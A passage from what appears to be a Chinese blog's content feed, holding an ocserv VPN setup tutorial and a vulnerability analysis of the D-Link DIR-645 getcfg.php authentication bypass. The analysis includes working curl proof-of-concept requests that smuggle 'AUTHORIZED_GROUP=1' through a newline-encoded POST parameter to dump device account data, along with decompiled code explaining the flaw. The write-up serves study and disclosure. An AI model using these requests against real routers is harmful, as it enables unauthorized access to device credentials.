+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.infradead.org/ocserv/download/ocserv-1.3.0.tar.xz</span><br><span class="line">tar -xvf ocserv-1.3.0.tar.xz</span><br><span class="line">cd ocserv-1.3.0</span><br><span class="line">./configure --sysconfdir=/etc</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<p>新建目录，用于存放 ocserv 的配置文件。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir /etc/ocserv</span><br><span class="line">sudo cp doc/sample.config /etc/ocserv/ocserv.conf</span><br></pre></td></tr></table></figure>
+
+<p>复制 <code>ocserv.service</code> 文件，创建 ocserv 服务。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp doc/systemd/standalone/ocserv.service /lib/systemd/system/</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置系统"><a href="#配置系统" class="headerlink" title="配置系统"></a>配置系统</h2><p>编辑 <code>/etc/sysctl.conf</code> 文件，修改以下配置。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#net.ipv4.ip_forward=1 =&gt; net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
+
+<p>应用配置文件。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure>
+
+<p>配置 iptables 防火墙的 NAT 功能。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo iptables -t nat -A POSTROUTING -j MASQUERADE</span><br></pre></td></tr></table></figure>
+
+<h2 id="制作证书"><a href="#制作证书" class="headerlink" title="制作证书"></a>制作证书</h2><p>新建任意目录，用于存放制作的自签名证书。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir certificates</span><br><span class="line">cd certificates</span><br></pre></td></tr></table></figure>
+
+<p>新建 <code>ca.tmpl</code> 模板文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cn = &quot;your organization’s certificate authority&quot;</span><br><span class="line">organization = &quot;your organization&quot;</span><br><span class="line">serial = 1</span><br><span class="line">expiration_days = 3650</span><br><span class="line">ca</span><br><span class="line">signing_key</span><br><span class="line">cert_signing_key</span><br><span class="line">crl_signing_key</span><br></pre></td></tr></table></figure>
+
+<p>新建 <code>server.tmpl</code> 模板文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cn = &quot;a sever&#x27;s name, usually matches hostname&quot;</span><br><span class="line">organization = &quot;your organization&quot;</span><br><span class="line">serial = 2</span><br><span class="line">expiration_days = 3650</span><br><span class="line">signing_key</span><br><span class="line">encryption_key</span><br><span class="line">tls_www_server</span><br></pre></td></tr></table></figure>
+
+<p>生成 CA 证书。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certtool --generate-privkey --outfile ca-key.pem</span><br><span class="line">certtool --generate-self-signed --load-privkey ca-key.pem --template ca.tmpl --outfile  ca-cert.pem</span><br></pre></td></tr></table></figure>
+
+<p>生成服务器证书。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">certtool --generate-privkey --outfile server-key.pem</span><br><span class="line">certtool --generate-certificate --load-privkey server-key.pem --load-ca-certificate ca-cert.pem --load-ca-privkey ca-key.pem --template server.tmpl --outfile server-cert.pem</span><br></pre></td></tr></table></figure>
+
+<p>将服务器证书复制到 <code>/etc/ocserv</code> 目录。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo cp server-key.pem server-cert.pem /etc/ocserv/</span><br></pre></td></tr></table></figure>
+
+<h2 id="配置应用"><a href="#配置应用" class="headerlink" title="配置应用"></a>配置应用</h2><p>编辑 <code>/etc/ocserv/ocserv.conf</code> 文件，主要修改以下配置。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用用户名和密码进行登录</span><br><span class="line">auth = &quot;plain[passwd=/etc/ocserv/ocpasswd]&quot;</span><br><span class="line"></span><br><span class="line"># 指定服务监听端口</span><br><span class="line">tcp-port = 443</span><br><span class="line">udp-port = 443</span><br><span class="line"></span><br><span class="line"># 指定服务器证书</span><br><span class="line">server-cert = /etc/ocserv/server-cert.pem</span><br><span class="line">server-key = /etc/ocserv/server-key.pem</span><br><span class="line"></span><br><span class="line"># 允许同时连接的客户端数量</span><br><span class="line">max-clients = 4</span><br><span class="line"></span><br><span class="line"># 限制同一客户端的并行登陆数量</span><br><span class="line">max-same-clients = 2</span><br><span class="line"></span><br><span class="line"># 自动优化 MTU 属性，尝试改善网络性能</span><br><span class="line">try-mtu-discovery = true</span><br><span class="line"></span><br><span class="line"># 指定证书版本，确保服务器正确读取客户端使用的用户证书。</span><br><span class="line">cert-user-oid = 2.5.4.3</span><br><span class="line"></span><br><span class="line"># VPN 分配的网段</span><br><span class="line">ipv4-network = 192.168.1.0</span><br><span class="line">ipv4-netmask = 255.255.255.0</span><br><span class="line"></span><br><span class="line"># VPN 分配的 DNS 服务器</span><br><span class="line">dns = 8.8.8.8</span><br><span class="line">dns = 1.1.1.1</span><br><span class="line"></span><br><span class="line"># 注释掉所有路由，使服务器成为网关</span><br><span class="line">#route = 10.0.0.0/8</span><br><span class="line">#route = 172.16.0.0/12</span><br><span class="line">#route = 192.168.0.0/16</span><br><span class="line"></span><br><span class="line"># 启用 Cisco 客户端兼容性支持</span><br><span class="line">cisco-client-compat = true</span><br></pre></td></tr></table></figure>
+
+<p>添加用户用于 VPN 登录。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ocpasswd -c /etc/ocserv/ocpasswd test</span><br></pre></td></tr></table></figure>
+
+<h2 id="运行应用"><a href="#运行应用" class="headerlink" title="运行应用"></a>运行应用</h2><p>通过指定配置文件运行应用。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ocserv -c /etc/ocserv/ocserv.conf</span><br></pre></td></tr></table></figure>
+
+<p>以调试模式运行应用。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ocserv -c /etc/ocserv/ocserv.conf -f -d 1</span><br></pre></td></tr></table></figure>
+
+<p>启动服务，并设置开机启动。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl start ocserv.service</span><br><span class="line">sudo systemctl enable ocserv.service</span><br></pre></td></tr></table></figure>
+
+<p>查看端口确认服务是否开启。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> netstat -anop | grep 443</span></span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      4280/ocserv     off (0.00/0/0)</span><br><span class="line">udp        0      0 0.0.0.0:443             0.0.0.0:*                           4280/ocserv     off (0.00/0/0)</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ednovas.xyz/2022/02/16/ocserv/">使用 ocserv 搭建企业级 OpenConnect VPN 网关 | EdNovas 的小站</a></p>
+<p><a href="https://www.mobibrw.com/2023/38751">深海游弋的鱼 – 默默的点滴</a></p>
+<p><a href="https://docs.openconnect-vpn.net/recipes/ocserv-configuration-basic/">Basic ocserv configuration - OpenConnect VPN how-to guides</a></p>
+<p><a href="http://www.evilvoid.cn/2018/03/24/%E4%BD%BF%E7%94%A8ocserv%E6%90%AD%E5%BB%BA%20VPN%20%E7%95%85%E6%B8%B8%E7%BD%91%E7%BB%9C/">使用ocserv搭建 VPN 畅游网络 | evilvoid</a></p>
+<p><a href="https://docs.openconnect-vpn.net/recipes/ocserv-installation-generic/">Generic - OpenConnect VPN how-to guides</a></p>
+<p><a href="https://www.mail-archive.com/ubuntu-bugs@lists.ubuntu.com/msg6032534.html">[Bug 1975550] [NEW] OpenConnect VPN (ocserv): general protection fault in ocserv-worker when a client tries to connect</a></p>
+]]></content>
+      <categories>
+        <category>工具应用</category>
+        <category>OpenConnect</category>
+      </categories>
+      <tags>
+        <tag>OpenConnect</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>D-Link DIR-645 getcfg.php 权限绕过漏洞分析</title>
+    <url>/cyber-security/vulnerability/app/d-link/d-link_dir-645_getcfg.php_%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p>D-Link DIR-645 getcfg.php 权限绕过漏洞分析。</p>
+<span id="more"></span>
+
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：无</p>
+<p>漏洞类型：权限绕过</p>
+<p>漏洞组件：&#x2F;usr&#x2F;sbin&#x2F;phpcgi</p>
+<p>漏洞路由：&#x2F;getcfg.php</p>
+<p>影响范围：</p>
+<ul>
+<li>D-Link DIR-645 &lt;&#x3D; A1 1.06B01</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>基于 D-Link DIR-645 A1 1.03B11 版本进行测试。</p>
+<p>对于 1.02 及之前版本固件的 PoC 如下。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -d SERVICES=DEVICE.ACCOUNT http://xx.xx.xx.xx/getcfg.php</span><br></pre></td></tr></table></figure>
+
+<p>对于 1.02 之后版本固件的 PoC 如下。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -d &quot;SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1&quot; &quot;http://xx.xx.xx.xx/getcfg.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令，得到设备用户的用户名和密码。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d <span class="string">&quot;SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1&quot;</span> <span class="string">&quot;http://192.168.0.1/getcfg.php&quot;</span></span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;postxml&gt;</span><br><span class="line">&lt;module&gt;</span><br><span class="line">	&lt;service&gt;DEVICE.ACCOUNT&lt;/service&gt;</span><br><span class="line">	&lt;device&gt;</span><br><span class="line">		&lt;gw_name&gt;DIR-645&lt;/gw_name&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;account&gt;</span><br><span class="line">			&lt;seqno&gt;&lt;/seqno&gt;</span><br><span class="line">			&lt;max&gt;2&lt;/max&gt;</span><br><span class="line">			&lt;count&gt;1&lt;/count&gt;</span><br><span class="line">			&lt;entry&gt;</span><br><span class="line">				&lt;uid&gt;&lt;/uid&gt;</span><br><span class="line">				&lt;name&gt;Admin&lt;/name&gt;</span><br><span class="line">				&lt;usrid&gt;&lt;/usrid&gt;</span><br><span class="line">				&lt;password&gt;&lt;/password&gt;</span><br><span class="line">				&lt;group&gt;0&lt;/group&gt;</span><br><span class="line">				&lt;description&gt;&lt;/description&gt;</span><br><span class="line">			&lt;/entry&gt;</span><br><span class="line">		&lt;/account&gt;</span><br><span class="line">		&lt;group&gt;</span><br><span class="line">			&lt;seqno&gt;&lt;/seqno&gt;</span><br><span class="line">			&lt;max&gt;&lt;/max&gt;</span><br><span class="line">			&lt;count&gt;0&lt;/count&gt;</span><br><span class="line">		&lt;/group&gt;</span><br><span class="line">		&lt;session&gt;</span><br><span class="line">			&lt;captcha&gt;0&lt;/captcha&gt;</span><br><span class="line">			&lt;dummy&gt;&lt;/dummy&gt;</span><br><span class="line">			&lt;timeout&gt;600&lt;/timeout&gt;</span><br><span class="line">			&lt;maxsession&gt;128&lt;/maxsession&gt;</span><br><span class="line">			&lt;maxauthorized&gt;16&lt;/maxauthorized&gt;</span><br><span class="line">		&lt;/session&gt;</span><br><span class="line">	&lt;/device&gt;</span><br><span class="line">&lt;/module&gt;</span><br><span class="line">&lt;/postxml&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据漏洞路由，查看 <code>/htdocs/web/getcfg.php</code> 页面的主要代码。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&quot;CACHE&quot;</span>] == <span class="string">&quot;true&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">dump</span>(<span class="number">1</span>, <span class="string">&quot;/runtime/session/&quot;</span>.<span class="variable">$SESSION_UID</span>.<span class="string">&quot;/postxml&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_power_user</span>() == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* cut_count() will return 0 when no or only one token. */</span></span><br><span class="line">		<span class="variable">$SERVICE_COUNT</span> = <span class="title function_ invoke__">cut_count</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="string">&quot;,&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: got &quot;</span>.<span class="variable">$SERVICE_COUNT</span>.<span class="string">&quot; service(s): &quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>]);</span><br><span class="line">		<span class="variable">$SERVICE_INDEX</span> = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (<span class="variable">$SERVICE_INDEX</span> &lt; <span class="variable">$SERVICE_COUNT</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$GETCFG_SVC</span> = <span class="title function_ invoke__">cut</span>(<span class="variable">$_POST</span>[<span class="string">&quot;SERVICES&quot;</span>], <span class="variable">$SERVICE_INDEX</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">			<span class="title function_ invoke__">TRACE_debug</span>(<span class="string">&quot;GETCFG: serivce[&quot;</span>.<span class="variable">$SERVICE_INDEX</span>.<span class="string">&quot;] = &quot;</span>.<span class="variable">$GETCFG_SVC</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$GETCFG_SVC</span>!=<span class="string">&quot;&quot;</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$file</span> = <span class="string">&quot;/htdocs/webinc/getcfg/&quot;</span>.<span class="variable">$GETCFG_SVC</span>.<span class="string">&quot;.xml.php&quot;</span>;</span><br><span class="line">				<span class="comment">/* GETCFG_SVC will be passed to the child process. */</span></span><br><span class="line">				<span class="keyword">if</span> (<span class="title function_ invoke__">isfile</span>(<span class="variable">$file</span>)==<span class="string">&quot;1&quot;</span>) <span class="title function_ invoke__">dophp</span>(<span class="string">&quot;load&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$SERVICE_INDEX</span>++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">/* not a power user, return error message */</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\t&lt;result&gt;FAILED&lt;/result&gt;\n&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;\t&lt;message&gt;Not authorized&lt;/message&gt;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;/postxml&gt;</span><br></pre></td></tr></table></figure>
+
+<p>页面调用 <code>is_power_user</code> 函数对当前请求的权限进行验证，通过后根据 <code>SERVICES</code> 参数的值读取 <code>/htdocs/webinc/getcfg/</code> 目录下的文件内容。</p>
+<p>在 <code>/htdocs/webinc/getcfg/</code> 目录下有许多配置文件，其中 <code>DEVICE.ACCOUNT.xml.php</code> 便可以读取设备的账号信息。</p>
+<p>页面权限的验证方式为当 <code>AUTHORIZED_GROUP</code> 全局变量的值是为空或者为 “0” 时，表示验证失败，否则表示验证成功。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_power_user</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GLOBALS</span>[<span class="string">&quot;AUTHORIZED_GROUP&quot;</span>] == <span class="string">&quot;&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GLOBALS</span>[<span class="string">&quot;AUTHORIZED_GROUP&quot;</span>] &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过全局字符串搜索，猜测全局变量在负责 php 文件请求的 <code>/usr/sbin/phpcgi</code> 文件中进行处理。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> -l usr/sbin/phpcgi</span> </span><br><span class="line">lrwxrwxrwx 1 person person 14 Oct 22 01:47 usr/sbin/phpcgi -&gt; /htdocs/cgibin</span><br></pre></td></tr></table></figure>
+
+<p>查看 cgibin 文件的 <code>main</code> 函数可知，phpcgi 文件由 <code>phpcgi_main</code> 函数负责处理。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;phpcgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = phpcgi_main;</span><br><span class="line">  v9 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>phpcgi_main</code> 函数中，根据请求方式的不同，将选择不同的解析函数。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  req_method = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  req_method_1 = req_method;</span><br><span class="line">  <span class="keyword">if</span> ( !req_method )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  <span class="keyword">if</span> ( !strcasecmp(req_method, <span class="string">&quot;HEAD&quot;</span>) || !strcasecmp(req_method_1, <span class="string">&quot;GET&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    parser = t_get_parser;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(req_method_1, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_20:</span><br><span class="line">    v5 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  parser = t_post_parser;</span><br></pre></td></tr></table></figure>
+
+<p>程序调用 <code>cgibin_parse_request</code> 函数对 HTTP 请求的内容进行解析，最终将解析后的参数交给 PHP 页面进行处理。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v5 = cgibin_parse_request(parser, req_args_1, <span class="number">0x80000</span>);</span><br><span class="line"><span class="keyword">if</span> ( v5 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v13 = sess_validate();</span><br><span class="line">  <span class="built_in">sprintf</span>(auth_group, <span class="string">&quot;AUTHORIZED_GROUP=%d&quot;</span>, v13);</span><br><span class="line">  sobj_add_string(req_args_1, auth_group);</span><br><span class="line">  sobj_add_char(req_args_1, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  sobj_add_string(req_args_1, <span class="string">&quot;SESSION_UID=&quot;</span>);</span><br><span class="line">  sess_get_uid(req_args_1);</span><br><span class="line">  sobj_add_char(req_args_1, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="built_in">string</span> = sobj_get_string(req_args_1);</span><br><span class="line">  v5 = xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, <span class="built_in">string</span>, <span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">-100</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v12 = fopen(<span class="string">&quot;/htdocs/web/info.php&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">    fclose(v12);</span><br><span class="line">    cgibin_print_http_resp(<span class="number">1</span>, <span class="string">&quot;/info.php&quot;</span>, <span class="string">&quot;FAIL&quot;</span>, <span class="string">&quot;ERR_REQ_TOO_LONG&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  cgibin_print_http_status(<span class="number">400</span>, <span class="string">&quot;unsupported HTTP request&quot;</span>, <span class="string">&quot;unsupported HTTP request&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>请求解析完成之后，程序将根据 Session 的有效性，设置 <code>AUTHORIZED_GROUP</code> 和 <code>SESSION_UID</code> 参数的值。</p>
+<p>分析请求解析函数可知，程序以 <code>&amp;</code> 作为分隔符对 Post 请求中的数据进行解析，然后使用 <code>\n</code> 作为分隔符对解析后的参数进行存储，存储的参数名称为 <code>_POST_XXXX</code> 格式。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sobj_add_string(req_args, <span class="string">&quot;_POST_&quot;</span>);</span><br><span class="line">    v5 = sobj_get_string(a2[<span class="number">1</span>]);</span><br><span class="line">    sobj_add_string(req_args, v5);</span><br><span class="line">    sobj_add_char(req_args, <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    v6 = a2[<span class="number">2</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = (<span class="type">void</span> **)sobj_get_string(v6);</span><br><span class="line">LABEL_11:</span><br><span class="line">  sobj_add_string(req_args, v11);</span><br><span class="line">  <span class="keyword">return</span> sobj_add_char(req_args, <span class="string">&#x27;\n&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>因此，当 Post 请求数据中有 <code>A=a%0aAUTHORIZED_GROUP=1</code> 参数时，将会被解析成 <code>_POST_A=a\nAUTHORIZED_GROUP=1</code> 形式的数据。</p>
+<p>由于在参数列表中，解析数据比最终的权限校验数据位置靠前，所以导致 PHP 读取所需参数时，先得到伪造的校验数据，而非正确的校验数据。从而实现权限认证的绕过。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据漏洞分析，构造绕过权限认证的 Post 数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SERVICES=DEVICE.ACCOUNT&amp;A=a%0aAUTHORIZED_GROUP=1</span><br></pre></td></tr></table></figure>
+
+<p>读取设备的账号信息。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d <span class="string">&quot;SERVICES=DEVICE.ACCOUNT&amp;A=a%0aAUTHORIZED_GROUP=1&quot;</span> <span class="string">&quot;http://192.168.0.1/getcfg.php&quot;</span></span></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;postxml&gt;</span><br><span class="line">&lt;module&gt;</span><br><span class="line">	&lt;service&gt;DEVICE.ACCOUNT&lt;/service&gt;</span><br><span class="line">	&lt;device&gt;</span><br><span class="line">		&lt;gw_name&gt;DIR-645&lt;/gw_name&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;account&gt;</span><br><span class="line">			&lt;seqno&gt;&lt;/seqno&gt;</span><br><span class="line">			&lt;max&gt;2&lt;/max&gt;</span><br><span class="line">			&lt;count&gt;1&lt;/count&gt;</span><br><span class="line">			&lt;entry&gt;</span><br><span class="line">				&lt;uid&gt;&lt;/uid&gt;</span><br><span class="line">				&lt;name&gt;Admin&lt;/name&gt;</span><br><span class="line">				&lt;usrid&gt;&lt;/usrid&gt;</span><br><span class="line">				&lt;password&gt;&lt;/password&gt;</span><br><span class="line">				&lt;group&gt;0&lt;/group&gt;</span><br><span class="line">				&lt;description&gt;&lt;/description&gt;</span><br><span class="line">			&lt;/entry&gt;</span><br><span class="line">		&lt;/account&gt;</span><br><span class="line">		&lt;group&gt;</span><br><span class="line">			&lt;seqno&gt;&lt;/seqno&gt;</span><br><span class="line">			&lt;max&gt;&lt;/max&gt;</span><br><span class="line">			&lt;count&gt;0&lt;/count&gt;</span><br><span class="line">		&lt;/group&gt;</span><br><span class="line">		&lt;session&gt;</span><br><span class="line">			&lt;captcha&gt;0&lt;/captcha&gt;</span><br><span class="line">			&lt;dummy&gt;&lt;/dummy&gt;</span><br><span class="line">			&lt;timeout&gt;600&lt;/timeout&gt;</span><br><span class="line">			&lt;maxsession&gt;128&lt;/maxsession&gt;</span><br><span class="line">			&lt;maxauthorized&gt;16&lt;/maxauthorized&gt;</span><br><span class="line">		&lt;/session&gt;</span><br><span class="line">	&lt;/device&gt;</span><br><span class="line">&lt;/module&gt;</span><br><span class="line">&lt;/postxml&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/6453">Dlink getcfg.php远程敏感信息读取漏洞分析 - 先知社区</a></p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>安全漏洞</category>
+      </categories>
+      <tags>
+        <tag>D-Link</tag>
+        <tag>漏洞分析</tag>
       </tags>
   </entry>
   <entry>
